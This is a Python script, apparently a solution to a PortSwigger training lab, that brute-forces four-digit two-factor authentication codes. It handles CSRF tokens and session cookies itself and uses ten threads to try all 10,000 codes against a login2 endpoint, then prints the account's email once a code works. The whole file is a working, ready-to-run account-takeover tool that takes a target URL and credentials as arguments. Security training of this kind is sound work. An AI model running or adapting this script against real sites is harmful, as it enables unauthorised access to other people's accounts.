from concurrent.futures import ThreadPoolExecutor, as_completed
from requests import request
from sys import argv

def extract_cookie(res):
    return res.headers.get('Set-Cookie').split(';')[0]

def extract_csrf(res):
    content=res.content.decode()
    indexOfCsrf=content.index('csrf')
    csrf=content[indexOfCsrf+13:indexOfCsrf+45]
    return csrf

def brute_worker(url,username,password,mfa_code):
    print('[!] Trying :  '+'{:04d}'.format(mfa_code))
    
    print('GET /login')
    res=request(url=url+'login',method='GET')
    cookie=extract_cookie(res)
    csrf_token=extract_csrf(res)
    
    print('POST /login')
    res=request(url=url+'login',method='POST',headers={'Cookie':cookie},data='csrf='+csrf_token+'&username='+username+'&password='+password)
    
    print('GET /login2')
    csrf_token=extract_csrf(res)
    cookie=extract_cookie(res.history[0]) 
    
    print('POST /login2')
    res=request(url=url+'login2',method='POST',headers={'Cookie':cookie},data='csrf='+csrf_token+'&mfa-code='+'{:04d}'.format(mfa_code))
#checking 
    if res.content.decode().count('Incorrect security code')==0:
        print('[+] Cracked With MFA-Code : '+'{:04d}'.format(mfa_code))
        content=res.content.decode()
        emailStartIndex=content.index('Your email is:')
        print(content[emailStartIndex:-1].split("</p>")[0])
        return True
    else:
        return False 

def bruteforce(url,username,password):
    if url[-1]!='/':
        url=url+'/'
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_code = {}
        for mfa_code in range(0,10000):
            future = executor.submit(brute_worker, url,username,password,mfa_code)
            future_to_code[future] = mfa_code
        
        for future in as_completed(future_to_code):
            mfa_code = future_to_code[future]
            try:
                result = future.result()
                if result:
                    executor.shutdown(wait=False)
                    for f in future_to_code.keys():
                        if f != future:
                            f.cancel()
            except Exception as exc:
                exit()


if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : 2FA bypass using a brute-force attack
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==4:
     bruteforce(argv[1],argv[2],argv[3])
 else:
     print("call it with : ./pwn-auth-2fa-expert-lab-bruteforce.py <url> <username> <password>  ")
